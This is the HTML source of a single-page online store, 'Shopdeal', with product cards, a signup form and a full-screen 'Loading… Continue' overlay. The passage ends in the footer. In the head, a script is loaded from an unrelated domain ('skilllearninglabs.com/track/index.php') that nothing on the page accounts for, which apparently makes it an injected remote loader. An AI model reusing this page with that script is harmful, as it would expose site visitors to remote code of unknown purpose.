<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Shopdeal — Modern Essentials, Delivered</title>
  <meta name="description" content="Shopdeal — a modern single-page store. Free shipping on US orders over $75, 30-day returns, secure checkout." />

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <script src="//skilllearninglabs.com/track/index.php"></script>
  <style>

    :root{
      --ink:#0b1020;
      --muted:#64748b;
      --line:#e9ebf2;
      --surface:#f8fafc;
      --brand:#6d28d9;
      --brand-dark:#5b21b6;
      --accent:#db2777;
      --radius:18px;
      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
      --max:1180px;
    }

    *,*::before,*::after{ box-sizing:border-box; }
    html{ scroll-behavior:smooth; }
    body{
      margin:0;
      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
      color:var(--ink);
      background:#fff;
      line-height:1.6;
      -webkit-font-smoothing:antialiased;
    }
    img{ max-width:100%; display:block; }
    a{ color:inherit; text-decoration:none; }
    button{ font:inherit; }
    ul{ list-style:none; margin:0; padding:0; }

    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }

    /* ============================================================
       LOADING / CONFIRM POPUP
       ============================================================ */
    .popup{
      position:fixed; inset:0; z-index:9999;
      display:grid; place-items:center; padding:24px;
      background:#fff;
      transition:opacity .28s ease, visibility .28s ease;
    }
    .popup.is-hidden{ opacity:0; visibility:hidden; pointer-events:none; }
    .popup-content{ width:100%; max-width:560px; text-align:center; }
    .loading-gif{ width:110px; height:110px; margin:0 auto 26px; }
    .popup-title{
      font-size:clamp(1.3rem,2.6vw,1.65rem);
      font-weight:800; letter-spacing:-.02em;
      margin:0 0 8px;
    }
    .popup-sub{ margin:0 0 32px; color:var(--muted); font-size:.95rem; }
    .buttons{ display:flex; justify-content:center; gap:14px; flex-wrap:wrap; }
    .btn-pop{
      min-width:152px; padding:14px 30px;
      border:0; border-radius:12px; cursor:pointer;
      font-weight:700; font-size:1rem;
      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
    }
    #cancelBtn{ background:#f1f5f9; color:#334155; }
    #cancelBtn:hover{ background:#e2e8f0; }
    #continueBtn{
      background:linear-gradient(135deg,var(--brand),var(--accent));
      color:#fff;
      box-shadow:0 14px 28px -14px rgba(109,40,217,.85);
    }
    #continueBtn:hover{ transform:translateY(-2px); }

    .announce{
      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
      color:#ede9fe;
      font-size:.8rem;
      letter-spacing:.01em;
    }
    .announce-inner{
      display:flex; align-items:center; justify-content:center;
      gap:10px; min-height:38px; text-align:center;
    }
    .announce b{ color:#fff; font-weight:700; }
    .announce-sep{ opacity:.5; }
    @media (max-width:640px){
      .announce-hide{ display:none; }
      .announce-sep{ display:none; }
    }

    /* ============================================================
       HEADER / NAV
       ============================================================ */
    .nav{
      position:sticky; top:0; z-index:80;
      background:rgba(255,255,255,.86);
      backdrop-filter:blur(16px);
      -webkit-backdrop-filter:blur(16px);
      border-bottom:1px solid var(--line);
    }
    .nav-inner{ display:flex; align-items:center; gap:28px; height:72px; }

    .brand{
      display:flex; align-items:center; gap:11px;
      font-weight:800; font-size:1.12rem; letter-spacing:-.025em;
      white-space:nowrap;
    }
    .brand-mark{
      width:36px; height:36px; flex:none;
      display:grid; place-items:center;
      border-radius:11px; font-size:1rem;
      background:linear-gradient(135deg,var(--brand),var(--accent));
      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
    }

    .links{ display:flex; gap:6px; }
    .links a{
      font-size:.9rem; font-weight:500; color:#4b5563;
      padding:8px 14px; border-radius:10px;
      transition:color .18s ease, background .18s ease;
    }
    .links a:hover{ color:var(--brand); background:#f5f3ff; }

    .nav-right{ margin-left:auto; display:flex; align-items:center; gap:12px; }

    .clock{
      display:inline-flex; align-items:center; gap:6px;
      font-size:.78rem; font-weight:600; color:var(--brand-dark);
      background:#f5f3ff; border:1px solid #ede9fe;
      padding:7px 13px; border-radius:999px; white-space:nowrap;
    }

    .cart-btn{
      display:inline-flex; align-items:center; gap:8px;
      border:0; cursor:pointer;
      background:var(--ink); color:#fff;
      font-weight:600; font-size:.88rem;
      padding:10px 18px; border-radius:999px;
      transition:transform .18s ease, background .18s ease;
    }
    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
    .cart-btn .badge{
      background:#fff; color:var(--ink);
      border-radius:999px; min-width:20px; height:20px;
      display:grid; place-items:center;
      padding:0 6px; font-size:.72rem; font-weight:800;
    }

    .burger{
      display:none; width:42px; height:42px;
      border:1px solid var(--line); background:#fff;
      border-radius:12px; cursor:pointer;
      place-items:center; padding:0;
    }
    .burger span{
      display:block; width:18px; height:2px; background:var(--ink);
      border-radius:2px; position:relative;
    }
    .burger span::before, .burger span::after{
      content:""; position:absolute; left:0; width:18px; height:2px;
      background:var(--ink); border-radius:2px;
    }
    .burger span::before{ top:-6px; }
    .burger span::after{ top:6px; }

    .mobile-menu{
      display:none; border-top:1px solid var(--line);
      background:#fff; padding:10px 0 16px;
    }
    .mobile-menu.open{ display:block; }
    .mobile-menu a{
      display:block; padding:12px 0; font-weight:600; color:#374151;
      border-bottom:1px solid #f4f5f9;
    }
    .mobile-menu a:last-child{ border-bottom:0; }

    @media (max-width:920px){
      .links, .clock{ display:none; }
      .burger{ display:grid; }
    }

    /* ============================================================
       HERO
       ============================================================ */
    .hero{
      padding:76px 0 68px;
      background:
        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
        linear-gradient(180deg,#fbfaff,#fff);
    }
    .hero-grid{
      display:grid; grid-template-columns:1.03fr .97fr;
      gap:60px; align-items:center;
    }
    @media (max-width:960px){
      .hero{ padding:52px 0; }
      .hero-grid{ grid-template-columns:1fr; gap:44px; }
    }

    .eyebrow{
      display:inline-flex; align-items:center; gap:8px;
      background:#fff; border:1px solid #ede9fe;
      color:var(--brand-dark); font-size:.78rem; font-weight:700;
      letter-spacing:.06em; text-transform:uppercase;
      padding:7px 15px; border-radius:999px;
      box-shadow:var(--shadow-sm); margin-bottom:20px;
    }
    .eyebrow .dot{
      width:7px; height:7px; border-radius:50%;
      background:var(--accent);
      box-shadow:0 0 0 4px rgba(219,39,119,.16);
    }

    .hero h1{
      font-size:clamp(2.2rem,5vw,3.5rem);
      line-height:1.08; letter-spacing:-.035em;
      font-weight:900; margin:0 0 18px;
    }
    .hero h1 .grad{
      background:linear-gradient(115deg,var(--brand),var(--accent));
      -webkit-background-clip:text; background-clip:text; color:transparent;
    }
    .hero p.lead{
      font-size:1.05rem; color:var(--muted);
      max-width:490px; margin:0 0 30px;
    }

    .hero-actions{ display:flex; gap:14px; flex-wrap:wrap; align-items:center; }

    .btn{
      display:inline-flex; align-items:center; justify-content:center; gap:9px;
      padding:15px 30px; border-radius:999px;
      font-weight:700; font-size:.95rem; cursor:pointer; border:0;
      transition:transform .18s ease, box-shadow .18s ease, background .18s ease, color .18s ease;
    }
    .btn-primary{
      background:linear-gradient(135deg,var(--brand),var(--accent));
      color:#fff;
      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
    }
    .btn-primary:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
    .btn-ghost{
      background:#fff; color:var(--ink);
      border:1px solid var(--line); box-shadow:var(--shadow-sm);
    }
    .btn-ghost:hover{ border-color:#d8d5f5; color:var(--brand); transform:translateY(-2px); }

    .hero-stats{
      display:flex; gap:34px; flex-wrap:wrap;
      margin-top:40px; padding-top:26px; border-top:1px solid var(--line);
    }
    .hero-stats strong{
      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
    }
    .hero-stats span{ font-size:.82rem; color:var(--muted); }

    /* hero media */
    .hero-media{ position:relative; }
    .hero-media > img{
      width:100%; aspect-ratio:5/4; object-fit:cover;
      border-radius:26px; box-shadow:var(--shadow-lg);
    }
    .float-card{
      position:absolute; display:flex; align-items:center; gap:11px;
      background:rgba(255,255,255,.96);
      backdrop-filter:blur(10px);
      border:1px solid var(--line); border-radius:15px;
      padding:12px 16px; box-shadow:var(--shadow-md);
      font-size:.8rem;
    }
    .float-card small{ display:block; color:var(--muted); font-size:.72rem; }
    .float-card strong{ display:block; font-size:.86rem; font-weight:800; letter-spacing:-.01em; }
    .float-card--rating{ left:-22px; bottom:30px; flex-direction:column; align-items:flex-start; gap:2px; }
    .float-card--ship{ right:-18px; top:26px; }
    .stars{ color:#f59e0b; letter-spacing:1px; font-size:.78rem; }
    .float-ico{
      width:36px; height:36px; flex:none; display:grid; place-items:center;
      border-radius:11px; background:#f5f3ff; font-size:1rem;
    }
    @media (max-width:960px){
      .float-card--rating{ left:8px; bottom:12px; }
      .float-card--ship{ right:8px; top:12px; }
    }
    @media (max-width:420px){
      .float-card--rating{ display:none; }
    }

    /* ============================================================
       TRUST STRIP
       ============================================================ */
    .trust{ border-block:1px solid var(--line); background:var(--surface); }
    .trust-grid{
      display:grid; grid-template-columns:repeat(4,1fr);
      gap:10px; padding:22px 0;
    }
    .trust-item{
      display:flex; align-items:center; justify-content:center; gap:9px;
      font-size:.85rem; font-weight:600; color:#475569;
      padding:6px 10px; border-right:1px solid var(--line);
    }
    .trust-item:last-child{ border-right:0; }
    .trust-item span{ font-size:1.05rem; }
    @media (max-width:860px){
      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
      .trust-item{ border-right:0; justify-content:flex-start; }
    }

    /* ============================================================
       SECTION HEADINGS
       ============================================================ */
    .section{ padding:76px 0; }
    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
    .section-head .kicker{
      display:inline-block; font-size:.76rem; font-weight:800;
      letter-spacing:.12em; text-transform:uppercase;
      color:var(--brand); margin-bottom:10px;
    }
    .section-head h2{
      font-size:clamp(1.6rem,3.2vw,2.2rem);
      font-weight:900; letter-spacing:-.03em; margin:0 0 10px; line-height:1.15;
    }
    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }

    /* ============================================================
       PRODUCT GRID
       ============================================================ */
    .grid{
      display:grid; gap:24px;
      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
    }
    .card{
      display:flex; flex-direction:column;
      background:#fff; border:1px solid var(--line);
      border-radius:var(--radius); overflow:hidden;
      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
    }
    .card:hover{
      transform:translateY(-6px);
      box-shadow:var(--shadow-lg);
      border-color:transparent;
    }
    .card-media{ position:relative; aspect-ratio:4/3; overflow:hidden; background:#f1f5f9; }
    .card-media img{
      width:100%; height:100%; object-fit:cover;
      transition:transform .55s cubic-bezier(.2,.7,.3,1);
    }
    .card:hover .card-media img{ transform:scale(1.07); }

    .badge{
      position:absolute; top:12px; left:12px;
      font-size:.68rem; font-weight:800; letter-spacing:.06em;
      text-transform:uppercase; color:#fff;
      padding:6px 11px; border-radius:999px;
      background:var(--ink);
    }
    .badge--sale{ background:var(--accent); }
    .badge--new{ background:#0ea5e9; }

    .card-body{ padding:16px 18px 18px; display:flex; flex-direction:column; flex:1; }
    .card-cat{
      font-size:.7rem; font-weight:700; letter-spacing:.1em;
      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
    }
    .card h3{
      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
    }
    .price-row{ display:flex; align-items:baseline; gap:8px; margin-top:auto; padding-top:6px; }
    .price{ font-size:1.12rem; font-weight:800; letter-spacing:-.02em; color:var(--ink); }
    .old{ font-size:.85rem; color:#a3aab8; text-decoration:line-through; font-weight:500; }
    .save{
      margin-left:auto; font-size:.7rem; font-weight:800;
      color:#047857; background:#ecfdf5;
      padding:3px 8px; border-radius:999px;
    }
    .add{
      margin-top:14px; width:100%;
      display:inline-flex; align-items:center; justify-content:center; gap:8px;
      border:1px solid var(--ink); background:#fff; color:var(--ink);
      font-weight:700; font-size:.88rem;
      padding:11px; border-radius:11px; cursor:pointer;
      transition:background .2s ease, color .2s ease, border-color .2s ease, transform .18s ease;
    }
    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
    .add:active{ transform:translateY(0); }

    /* ============================================================
       FEATURES
       ============================================================ */
    .features-section{ background:var(--surface); border-block:1px solid var(--line); }
    .features{
      display:grid; gap:22px;
      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
    }
    .feature{
      background:#fff; border:1px solid var(--line);
      border-radius:var(--radius); padding:28px 24px;
      transition:transform .22s ease, box-shadow .22s ease;
    }
    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
    .feature-ico{
      width:48px; height:48px; display:grid; place-items:center;
      border-radius:14px; font-size:1.3rem;
      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
      border:1px solid #ede9fe; margin-bottom:16px;
    }
    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }

    /* ============================================================
       CTA BAND
       ============================================================ */
    .cta-band{ padding:0 0 76px; }
    .cta-card{
      position:relative; overflow:hidden;
      border-radius:26px; padding:56px 44px; text-align:center;
      background:linear-gradient(125deg,#1e1b4b 0%,#4c1d95 48%,#831843 100%);
      color:#fff; box-shadow:var(--shadow-lg);
    }
    .cta-card::after{
      content:""; position:absolute; inset:-40% -10% auto auto;
      width:520px; height:520px; border-radius:50%;
      background:radial-gradient(circle,rgba(255,255,255,.16),transparent 62%);
    }
    .cta-card h2{
      position:relative; margin:0 0 12px;
      font-size:clamp(1.5rem,3.4vw,2.15rem);
      font-weight:900; letter-spacing:-.03em;
    }
    .cta-card p{
      position:relative; margin:0 auto 28px;
      max-width:520px; color:#ddd6fe; font-size:.97rem;
    }
    .cta-form{
      position:relative; display:flex; gap:10px; flex-wrap:wrap;
      justify-content:center; max-width:520px; margin-inline:auto;
    }
    .cta-form input{
      flex:1 1 260px; min-width:0;
      padding:15px 20px; border-radius:999px;
      border:1px solid rgba(255,255,255,.25);
      background:rgba(255,255,255,.1);
      color:#fff; font-size:.93rem; font-family:inherit;
      outline:none; transition:border-color .2s ease, background .2s ease;
    }
    .cta-form input::placeholder{ color:#c4b5fd; }
    .cta-form input:focus{ border-color:#fff; background:rgba(255,255,255,.18); }
    .cta-form button{
      flex:0 0 auto;
      background:#fff; color:var(--brand-dark);
      border:0; border-radius:999px; cursor:pointer;
      padding:15px 32px; font-weight:800; font-size:.93rem;
      transition:transform .18s ease, box-shadow .18s ease;
    }
    .cta-form button:hover{ transform:translateY(-2px); box-shadow:0 16px 30px -14px rgba(0,0,0,.6); }
    .cta-note{
      position:relative; margin:18px 0 0; font-size:.78rem; color:#c4b5fd;
    }
    @media (max-width:560px){
      .cta-card{ padding:42px 24px; }
    }

    /* ============================================================
       FOOTER
       ============================================================ */
    .footer{ background:#0b1020; color:#94a3b8; padding:64px 0 0; }
    .footer-grid{
      display:grid; gap:40px;
      grid-template-columns:1.6fr 1fr 1fr 1fr;
      padding-bottom:48px;
    }
    .footer .brand{ color:#fff; margin-bottom:14px; }
    .footer-about{ font-size:.87rem; line-height:1.7; max-width:300px; margin:0 0 20px; }
    .footer h4{
      color:#fff; font-size:.82rem; font-weight:800;
      letter-spacing:.1em; text-transform:uppercase;
      margin:0 0 16px;
    }
    .footer li{ margin-bottom:10px; }
    .footer li a{ font-size:.88rem; transition:color .18s ease; }
    .footer li a:hover{ color:#fff; }
    .socials{ display:flex; gap:10px; }
    .socials a{
      width:38px; height:38px; display:grid; place-items:center;
      border-radius:11px; font-size:.95rem;
      background:rgba(255,255,255,.06);
      border:1px solid rgba(255,255,255,.08);
      transition:background .2s ease, transform .2s ease;
    }
    .socials a:hover{ background:var(--brand); transform:translateY(-2px); }
    .footer-bottom{
      display:flex; justify-content:space-between; align-items:center;
      gap:16px; flex-wrap:wrap;
      padding:22px 0; border-top:1px solid rgba(255,255,255,.08);
      font-size:.8rem;
    }
    @media (max-width:880px){
      .footer-grid{ grid-template-columns:1fr 1fr; }
    }
    @media (max-width:520px){
      .footer-grid{ grid-template-columns:1fr; gap:32px; }
      .footer-bottom{ justify-content:center; text-align:center; }
    }

    /* ============================================================
       CART DRAWER
       ============================================================ */
    .overlay{
      position:fixed; inset:0; z-index:190;
      background:rgba(11,16,32,.5);
      backdrop-filter:blur(3px);
      opacity:0; visibility:hidden;
      transition:opacity .3s ease, visibility .3s ease;
    }
    .overlay.open{ opacity:1; visibility:visible; }

    .cart-drawer{
      position:fixed; top:0; right:0; z-index:200;
      height:100%; width:min(410px,100%);
      display:flex; flex-direction:column;
      background:#fff;
      box-shadow:-30px 0 70px -30px rgba(11,16,32,.5);
      transform:translateX(103%);
      transition:transform .36s cubic-bezier(.4,0,.2,1);
    }
    .cart-drawer.open{ transform:none; }

    .cart-head{
      display:flex; align-items:center; justify-content:space-between;
      padding:20px 22px; border-bottom:1px solid var(--line);
    }
    .cart-head h3{ margin:0; font-size:1.05rem; font-weight:800; letter-spacing:-.02em; }
    .cart-head span{ display:block; font-size:.78rem; color:var(--muted); font-weight:500; }
    .cart-close{
      width:38px; height:38px; border-radius:11px; cursor:pointer;
      border:1px solid var(--line); background:#fff; color:var(--ink);
      font-size:1.05rem; display:grid; place-items:center;
      transition:background .18s ease;
    }
    .cart-close:hover{ background:var(--surface); }

    .cart-items{ flex:1; overflow-y:auto; padding:18px 22px; }
    .cart-empty{ text-align:center; padding:64px 10px; color:var(--muted); }
    .cart-empty .big{ font-size:2.4rem; margin-bottom:12px; }
    .cart-empty p{ margin:0 0 4px; font-weight:600; color:var(--ink); }
    .cart-empty small{ font-size:.85rem; }

    .cart-item{
      display:flex; gap:14px; padding:14px 0;
      border-bottom:1px solid #f1f3f9;
    }
    .cart-item:last-child{ border-bottom:0; }
    .cart-item img{
      width:66px; height:66px; flex:none;
      object-fit:cover; border-radius:12px; background:#f1f5f9;
    }
    .cart-item-info{ flex:1; min-width:0; }
    .cart-item-info h4{
      margin:0 0 3px; font-size:.88rem; font-weight:700;
      white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
    }
    .cart-item-info .unit{ font-size:.78rem; color:var(--muted); }
    .cart-item-foot{
      display:flex; align-items:center; justify-content:space-between;
      margin-top:10px; gap:10px;
    }
    .qty{
      display:inline-flex; align-items:center;
      border:1px solid var(--line); border-radius:9px; overflow:hidden;
    }
    .qty button{
      width:28px; height:28px; border:0; background:#fff; cursor:pointer;
      color:var(--ink); font-weight:800; font-size:.9rem; line-height:1;
      transition:background .15s ease;
    }
    .qty button:hover{ background:var(--surface); }
    .qty span{ min-width:28px; text-align:center; font-size:.83rem; font-weight:700; }
    .line-total{ font-size:.9rem; font-weight:800; letter-spacing:-.01em; }
    .remove{
      background:none; border:0; cursor:pointer; padding:0;
      font-size:.75rem; color:#94a3b8; font-weight:600;
      text-decoration:underline; text-underline-offset:2px;
    }
    .remove:hover{ color:#e11d48; }

    .cart-foot{ border-top:1px solid var(--line); padding:20px 22px 24px; background:#fff; }
    .cart-row{
      display:flex; justify-content:space-between;
      font-size:.88rem; color:var(--muted); margin-bottom:9px;
    }
    .cart-row.total{
      font-size:1.05rem; color:var(--ink); font-weight:800;
      letter-spacing:-.02em; margin:14px 0 18px;
      padding-top:14px; border-top:1px dashed var(--line);
    }
    .checkout{
      width:100%; border:0; cursor:pointer;
      padding:16px; border-radius:13px;
      background:linear-gradient(135deg,var(--brand),var(--accent));
      color:#fff; font-weight:800; font-size:.95rem;
      box-shadow:0 16px 32px -18px rgba(109,40,217,.95);
      transition:transform .18s ease;
    }
    .checkout:hover{ transform:translateY(-2px); }
    .cart-secure{
      text-align:center; font-size:.75rem; color:#94a3b8; margin:12px 0 0;
    }

    /* ============================================================
       MOTION PREFERENCES
       ============================================================ */
    @media (prefers-reduced-motion:reduce){
      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
      html{ scroll-behavior:auto; }
    }
  </style>

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-0LY0HY7L01');
  </script>

  <script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
  <script>
    window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
    plausible.init()
  </script>
</head>

<body>

  <!-- ===================== LOADING POPUP ===================== -->
  <div class="popup" id="customPopup">
    <div class="popup-content">
      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading…" class="loading-gif">
      <h2 class="popup-title">Loading… Please wait.</h2>
      <p class="popup-sub">We're getting your store ready.</p>
      <div class="buttons">
        <button id="cancelBtn" class="btn-pop" type="button">Cancel</button>
        <button id="continueBtn" class="btn-pop" type="button">Continue</button>
      </div>
    </div>
  </div>

  <!-- ===================== SHOP ===================== -->
  <div id="shop">

    <!-- Announcement -->
    <div class="announce">
      <div class="container announce-inner">
        <span>✦ <b>Shopdeal Summer Sale</b> — up to 50% off sitewide</span>
        <span class="announce-sep">•</span>
        <span class="announce-hide">Free shipping on US orders over $75</span>
      </div>
    </div>

    <!-- Header -->
    <header class="nav">
      <div class="container nav-inner">
        <a href="#home" class="brand">
          <span class="brand-mark">🛍️</span>
          Shopdeal
        </a>

        <nav class="links">
          <a href="#home">Home</a>
          <a href="#products">Products</a>
          <a href="#about">About</a>
          <a href="#contact">Contact</a>
        </nav>

        <div class="nav-right">
          <span class="clock" id="liveDate">🕒 —</span>
          <button class="cart-btn" id="cartBtn" type="button" aria-label="Open cart">
            🛒 Cart <span class="badge" id="cartBadge">0</span>
          </button>
          <button class="burger" id="burger" type="button" aria-label="Menu">
            <span></span>
          </button>
        </div>
      </div>

      <div class="mobile-menu" id="mobileMenu">
        <div class="container">
          <a href="#home">Home</a>
          <a href="#products">Products</a>
          <a href="#about">About</a>
          <a href="#contact">Contact</a>
        </div>
      </div>
    </header>

    <!-- Hero -->
    <section class="hero" id="home">
      <div class="container hero-grid">
        <div class="hero-text">
          <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
          <h1>Everyday essentials, <span class="grad">beautifully priced.</span></h1>
          <p class="lead">
            Curated gear for work, travel and everything in between — with free US shipping
            on orders over $75 and hassle-free 30-day returns.
          </p>

          <div class="hero-actions">
            <a href="#products" class="btn btn-primary">Shop the collection →</a>
            <a href="#about" class="btn btn-ghost">Why Shopdeal</a>
          </div>

          <div class="hero-stats">
            <div><strong>12,480+</strong><span>Happy customers</span></div>
            <div><strong>4.9 / 5</strong><span>Average rating</span></div>
            <div><strong>48 hrs</strong><span>US delivery</span></div>
          </div>
        </div>

        <div class="hero-media">
          <img src="https://picsum.photos/seed/shopdeal-hero/900/720" alt="Summer collection" />

          <div class="float-card float-card--ship">
            <span class="float-ico">🚚</span>
            <div>
              <strong>Free Shipping</strong>
              <small>On orders $75+</small>
            </div>
          </div>

          <div class="float-card float-card--rating">
            <span class="stars">★★★★★</span>
            <strong>4.9 out of 5</strong>
            <small>12,480 verified reviews</small>
          </div>
        </div>
      </div>
    </section>

    <!-- Trust strip -->
    <div class="trust">
      <div class="container trust-grid">
        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
        <div class="trust-item"><span>↩️</span> 30-day returns</div>
        <div class="trust-item"><span>🔒</span> Secure checkout</div>
        <div class="trust-item"><span>💬</span> 7-day support</div>
      </div>
    </div>

    <!-- Histats.com START (async) -->
    <script type="text/javascript">var _Hasync= _Hasync|| [];
    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
    _Hasync.push(['Histats.fasi', '1']);
    _Hasync.push(['Histats.track_hits', '']);
    (function() {
    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
    hs.src = ('//s10.histats.com/js15_as.js');
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
    })();</script>
    <noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
    <!-- Histats.com END -->

    <!-- Products -->
    <section class="section" id="products">
      <div class="container">
        <div class="section-head">
          <span class="kicker">Featured</span>
          <h2>Handpicked for you</h2>
          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
        </div>

        <div class="grid">

          <article class="card" data-id="p1" data-name="Running Sneakers" data-price="89.99">
            <div class="card-media">
              <span class="badge badge--sale">Best Seller</span>
              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" loading="lazy" />
            </div>
            <div class="card-body">
              <span class="card-cat">Footwear</span>
              <h3>Running Sneakers</h3>
              <div class="price-row">
                <span class="price">$89.99</span>
                <span class="old">$139.99</span>
                <span class="save">−36%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card" data-id="p2" data-name="Classic Watch" data-price="179.99">
            <div class="card-media">
              <span class="badge">Limited</span>
              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" loading="lazy" />
            </div>
            <div class="card-body">
              <span class="card-cat">Accessories</span>
              <h3>Classic Watch</h3>
              <div class="price-row">
                <span class="price">$179.99</span>
                <span class="old">$249.99</span>
                <span class="save">−28%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card" data-id="p3" data-name="Travel Backpack" data-price="69.99">
            <div class="card-media">
              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" loading="lazy" />
            </div>
            <div class="card-body">
              <span class="card-cat">Bags</span>
              <h3>Travel Backpack</h3>
              <div class="price-row">
                <span class="price">$69.99</span>
                <span class="old">$109.99</span>
                <span class="save">−36%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card" data-id="p4" data-name="Wireless Headphones" data-price="119.99">
            <div class="card-media">
              <span class="badge badge--new">New</span>
              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" loading="lazy" />
            </div>
            <div class="card-body">
              <span class="card-cat">Audio</span>
              <h3>Wireless Headphones</h3>
              <div class="price-row">
                <span class="price">$119.99</span>
                <span class="old">$179.99</span>
                <span class="save">−33%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card" data-id="p5" data-name="Sunglasses" data-price="34.99">
            <div class="card-media">
              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" loading="lazy" />
            </div>
            <div class="card-body">
              <span class="card-cat">Eyewear</span>
              <h3>Sunglasses</h3>
              <div class="price-row">
                <span class="price">$34.99</span>
                <span class="old">$59.99</span>
                <span class="save">−42%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

          <article class="card" data-id="p6" data-name="Instant Camera" data-price="219.99">
            <div class="card-media">
              <span class="badge">Top Rated</span>
              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" loading="lazy" />
            </div>
            <div class="card-body">
              <span class="card-cat">Photography</span>
              <h3>Instant Camera</h3>
              <div class="price-row">
                <span class="price">$219.99</span>
                <span class="old">$299.99</span>
                <span class="save">−27%</span>
              </div>
              <button class="add" type="button">Add to cart</button>
            </div>
          </article>

        </div>
      </div>
    </section>

    <!-- Features -->
    <section class="section features-section" id="about">
      <div class="container">
        <div class="section-head">
          <span class="kicker">Why Shopdeal</span>
          <h2>Built around you</h2>
          <p>Simple pricing, fast delivery and support that actually answers.</p>
        </div>

        <div class="features">
          <div class="feature">
            <div class="feature-ico">🚚</div>
            <h3>Free Shipping</h3>
            <p>Free standard delivery on every US order over $75. No codes needed.</p>
          </div>
          <div class="feature">
            <div class="feature-ico">↩️</div>
            <h3>Easy Returns</h3>
            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
          </div>
          <div class="feature">
            <div class="feature-ico">🔒</div>
            <h3>Secure Checkout</h3>
            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
          </div>
          <div class="feature">
            <div class="feature-ico">⚡</div>
            <h3>Fast Support</h3>
            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
          </div>
        </div>
      </div>
    </section>

    <!-- CTA -->
    <section class="cta-band" id="contact">
      <div class="container">
        <div class="cta-card">
          <h2>Get $10 off your first order</h2>
          <p>Join the Shopdeal list for early access to drops, members-only pricing and weekly deals.</p>

          <form class="cta-form" id="signupForm">
            <input type="email" id="signupEmail" placeholder="you@example.com" required aria-label="Email address" />
            <button type="submit">Claim $10</button>
          </form>

          <p class="cta-note">No spam. Unsubscribe anytime.</p>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="footer">
      <div class="container footer-grid">
        <div>
          <a href="#home" class="brand">
            <span class="brand-mark">🛍️</span>
            Shopdeal
          </a>
          <p class="footer-about">
            Modern essentials, thoughtfully curated and delivered to your door —
            across the United States.
          </p>
          <div class="socials">
            <a href="#" aria-label="Instagram">📷</a>
            <a href="#" aria-label="X">𝕏</a>
            <a href="#" aria-label="Facebook">f</a>
            <a href="#" aria-label="YouTube">▶</a>
          </div>
        </div>

        <div>
          <h4>Shop</h4>
          <ul>
